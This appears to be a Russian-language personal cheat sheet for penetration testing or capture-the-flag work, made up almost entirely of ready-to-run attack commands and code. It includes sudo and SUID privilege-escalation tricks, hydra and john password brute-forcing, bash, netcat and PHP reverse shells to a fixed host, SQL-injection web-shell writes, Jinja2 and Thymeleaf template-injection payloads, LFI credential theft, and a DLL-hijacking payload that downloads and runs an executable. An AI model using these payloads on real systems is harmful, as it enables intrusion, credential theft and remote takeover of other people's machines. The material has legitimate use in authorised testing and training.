**Полезные штучки**

https://www.hackingarticles.in/red-teaming/

https://www.google.com/amp/s/habr.com/ru/amp/publications/691388/

**Postgres:**

Чтение каталогов через:
```
SELECT pg_ls_dir('/home');
```
Чтение файлов:
```
SELECT pg_read_file('/home/file');
```
**Доступные команды sudo: sudo -l**
**vim с правами root:**
```
/usr/bin/vim -c ":!/bin/bash"
/usr/bin/vim /etc/sudoers
  <твое_имя_пользователя> ALL=(ALL:ALL) NOPASSWD: ALL
```
**Перебор паролей ssh:**
```
hydra -l user -P password.txt ssh://IP
```
**Атака по открытому ключю:**
```
john --worldlist=password.txt --format=SSH id_rsa
```
**Перебор паролей FTP:***
```
hydra -l admin -P password.txt ftp://IP -t 1 -w 10
t - одно соединение за раз
w - задержка в 10 секунд
```
**Перебор паролей postgres:**
```
hydra -l postgres -P password.txt -V IP postgres
```
**Reverse shell:**
Если есть RCE:
```
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 - на цели
nc -lvnp 4444
```
ИЛИ:
```
nc -e /bin/sh 192.168.1.100 4444
```
ИЛИ:
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 4444 > /tmp/f
```
**Если можем загружать файл и открыать его:**
Создаем .php:
```
<?php
$sock=fsockopen("192.168.1.100",4444);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```
**Если есть SQLi Postgres:**
```
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
curl http://target.com/shell.php?cmd=whoami
```
**Если есть SSTI на Jinja2:**
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('nc -e /bin/sh 192.168.1.100 4444').read()
```
**Если есть SSTI на Thymeleaf:**
```
${T(java.lang.Runtime).getRuntime().exec("nc -e /bin/sh 192.168.1.100 4444")}
```
**Через LFI:**
```
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Декодируем данные, находим креды, используем их в дальнейшем

**DLL Hijacking**

Код:

```
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 switch(dwReason){
 case DLL_PROCESS_ATTACH:
 system("cmd /c powershell wget http://10.0.0.222:8080/agent.ex
e -O C:\\Windows\\Tasks\\agent.exe ; cmd /c C:\\Windows\\Tasks\\agent.exe"
);
 break;
 case DLL_PROCESS_DETACH:
 break;
 case DLL_THREAD_ATTACH:
 break;
 case DLL_THREAD_DETACH:
 break;
 }
 return TRUE;
}
```

Сборка:

```
x86_64-w64-mingw32-gcc -o dwmapi.dll -shared source.c
```

**Команды от sudo**

Если разрешен vim:

```
sudo vim -c ':!/bin/bash'

Или:

sudo vim
:!/bin/bash
```

Если разрешен nmap:

```
sudo nmap --interactive
# Внутри nmap:
!sh
```

Если разрешен find:

```
sudo find . -exec /bin/bash \;
```

Если разрешен /bin/sh или /bin/bash (редко, но возможно):

```
sudo /bin/bash
# или
sudo su
```

Проверка SUID/SGID бинарных файлов: Поиск файлов, которые запускаются с правами владельца, даже если пользователь имеет меньшие привилегии.

```
find / -perm -u=s -type f 2>/dev/null
```

Уязвимости ядра или сервисов: Поиск устаревших версий ОС или неправильно настроенных служб.
Учетные данные в файлах: Поиск паролей или ключей в конфигурационных файлах (/etc/passwd, /var/log, файлы веб-серверов и т.д.).
